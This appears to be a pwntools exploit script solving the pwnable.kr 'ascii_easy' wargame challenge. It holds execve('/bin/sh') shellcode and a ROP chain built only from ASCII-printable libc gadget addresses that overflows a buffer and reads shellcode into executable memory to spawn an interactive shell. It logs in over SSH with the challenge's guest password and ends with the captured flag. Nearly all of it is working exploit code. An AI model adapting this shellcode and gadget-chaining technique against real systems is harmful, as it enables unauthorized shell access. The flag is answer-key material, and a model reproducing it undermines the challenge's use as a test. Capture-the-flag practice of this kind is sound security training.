#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './ascii_easy')

# Erase argv & envp registers, then call execve syscall with '/bin/sh'.
shellcode = (
    b"\x31\xc0"                  # xor eax, eax
    b"\x31\xC9"                  # xor ecx, ecx
    b"\x31\xD2"                  # xor edx, edx
    b"\x68\x2f\x73\x68\x00"      # push 0x68732f2f ("/sh\x00")
    b"\x68\x2f\x62\x69\x6e"      # push 0x6e69622f ("/bin")
    b"\x89\xe3"                  # mov ebx, esp
    b"\x50"                      # push eax
    b"\x54"                      # push esp
    b"\x53"                      # push ebx
    b"\x50"                      # push eax
    b"\xb0\x0b"                  # mov al, 0x0b
    b"\xcd\x80"                  # int 0x80
)


### defines ###
BASE_ADDR = 0x5555e000
PADDING_SIZE = 24 # Triggering BOF & Overwrite RIP address.
BINSH_OFFSET = 0x15d7ec # Offset of "/bin/sh" string in libc
BINSH = BASE_ADDR + BINSH_OFFSET - 0x4070 # make it ascii
TARGET_RWX_ADDR = 0x55667179

### Ascii Gadgets ###
xor_eax_eax = 0x55642d7c
xchg_edi_eax_or_cl_byte_ptr_esi_adc_al_0x43 = 0x556f6061
xchg_ebx_edi_neg_eax_pop_edi = 0x55623b42
neg_eax_pop_edi = 0x55623b44
pop_ecx_add_al_0xa = 0x556d2a51
add_eax_3 = 0x556a5060
inc_es_int_0x80 = 0x55667176

### SSH Config ###

host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'ascii_easy'
password = args.PASSWORD or 'guest'

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    ssh_client = ssh(user, host, port=port, password=password, timeout=10)
    io = ssh_client.process(['./ascii_easy'] + argv, tty=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *vuln+42
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
def main():
    payload = cyclic(PADDING_SIZE)  # Padding to reach EIP
    payload += p32(0x21212121) # EBX = Garbage data
    payload += p32(0x21212121) # EBP = Garbage data

    ### Set ECX to BUF address ###
    payload += p32(pop_ecx_add_al_0xa) # ECX = TARGET_RWX_ADDR 
    payload += p32(TARGET_RWX_ADDR) # Addess to write shellcode


    ### Set EBX to 0 - stdin fd ###
    payload += p32(xor_eax_eax) # EAX = 0
    payload += p32(xchg_edi_eax_or_cl_byte_ptr_esi_adc_al_0x43) # EDI = 0
    payload += p32(xchg_ebx_edi_neg_eax_pop_edi) # EBX = 0
    payload += p32(0x21212121) # EDI

    ### Set EAX = 0x03 - read syscall ###
    payload += p32(xor_eax_eax) # EAX = 0
    payload += p32(add_eax_3) # EAX = 3

    ### call read(0, TARGET_RWX_ADDR, ${random address}) ###
    # Note: -- $(random address) > shellcode size
    payload += p32(inc_es_int_0x80)

    log.info("Sending payload...")
    io = start([payload.decode()]) #
    log.info("Payload sent!")

    log.info("Sending shellcode...")
    io.sendline(shellcode)
    log.info("Shellcode sent!") 

    io.interactive()

if __name__ == "__main__":
    main()

#flag: ASCII_armor_is_a_real_pain_to_d3al_with!
